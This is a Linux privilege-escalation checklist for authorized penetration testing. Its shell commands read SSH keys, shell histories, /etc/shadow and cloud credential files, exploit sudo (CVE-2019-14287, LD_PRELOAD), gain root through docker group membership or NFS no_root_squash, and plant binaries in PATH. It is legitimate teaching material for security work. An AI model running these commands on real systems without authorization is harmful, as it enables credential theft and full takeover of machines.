# Linux Privilege Escalation Checklist

A practical order of operations for a low-privilege shell on a Linux box you are authorized to test.

## 1. Know where you are

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
groups
pwd
ls -la
```

Check whether you are in a container:

```bash
cat /proc/1/cgroup
ls -la /.dockerenv
```

## 2. Read the local rules

```bash
sudo -l
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d 2>/dev/null
```

Look for `NOPASSWD`, wildcards, `env_keep`, and commands you can run. Check every allowed
binary against [GTFOBins](https://gtfobins.github.io/).

Useful sudo checks:

```bash
sudo -V
sudo -u#-1 id          # only if the version is vulnerable to CVE-2019-14287
sudo LD_PRELOAD=/tmp/x.so <allowed-command>
```

## 3. Hunt for credentials

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.ssh/id_rsa
find / -name "*.ssh" -o -name "id_rsa" 2>/dev/null
grep -RiE "password|passwd|secret|token|api_key" /var/www /opt /home 2>/dev/null
env
```

Also check:

- `/etc/passwd` and `/etc/shadow` (if readable)
- database config files (`wp-config.php`, `.env`, `config.php`)
- backup archives and old home directories
- `~/.aws/credentials`, `~/.config/gcloud`, `~/.kube/config`

## 4. SUID and SGID

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null
```

Check each binary on GTFOBins. Common wins: `find`, `vim`, `less`, `nmap`, `bash`, `cp`,
`python`, `perl`, `tar`, `env`, `awk`.

## 5. Capabilities

```bash
getcap -r / 2>/dev/null
```

Interesting capabilities:

- `cap_setuid+ep` — change UID
- `cap_setgid+ep` — change GID
- `cap_dac_read_search+ep` — bypass file read checks
- `cap_sys_admin+ep` — mount, namespace tricks
- `cap_net_raw+ep` — raw sockets

## 6. Scheduled jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all
```

Look for scripts writable by your user, relative paths, or a writable `PATH` directory.
`pspy` is excellent for watching short-lived jobs:

```bash
./pspy64 -pf -i 1000
```

## 7. Services and sockets

```bash
ps aux
ss -tulpn
systemctl list-units --type=service
```

Check for:

- services running as root with writable config or binary paths
- Unix sockets you can talk to
- local-only services you can port-forward
- `sudo`-less `systemctl` or `service` permissions

## 8. Writable files and PATH

```bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | head -100
echo $PATH
```

If a root cron job or service calls a binary by relative name, try placing a malicious
binary earlier in `PATH`.

## 9. Kernel and packages

```bash
uname -r
cat /etc/os-release
dpkg -l 2>/dev/null | head
rpm -qa 2>/dev/null | head
```

Search for kernel exploits:

```bash
searchsploit linux kernel $(uname -r)
./linux-exploit-suggester.sh
```

Do not run kernel exploits blindly. They can panic the box. Prefer a stable misconfiguration.

## 10. Group memberships

```bash
id
```

High-value groups:

- `docker` — mount the host filesystem
- `lxd` / `lxc` — privileged container escape
- `disk` — raw disk access
- `adm` — read logs
- `sudo` / `wheel` — see `sudo -l`
- `video` / `render` — device access

Docker group example:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## 11. NFS

```bash
showmount -e <target>
mount -t nfs <target>:/export /mnt
```

If the export has `no_root_squash`, create a SUID binary as root on the client and run it
on the target.

## 12. Automated helpers

- [LinPEAS](https://github.com/peass-ng/PEASS-ng)
- [pspy](https://github.com/DominicBreuker/pspy)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [GTFOBins](https://gtfobins.github.io/)

Run them, but verify every finding manually. False positives are common.

## Quick wins checklist

- [ ] `sudo -l` reviewed against GTFOBins
- [ ] SUID/SGID binaries reviewed
- [ ] Capabilities reviewed
- [ ] Cron jobs and timers reviewed
- [ ] Writable service files or scripts found
- [ ] Credentials found in history/config
- [ ] Docker/LXD/disk group membership
- [ ] NFS `no_root_squash`
- [ ] Kernel version checked
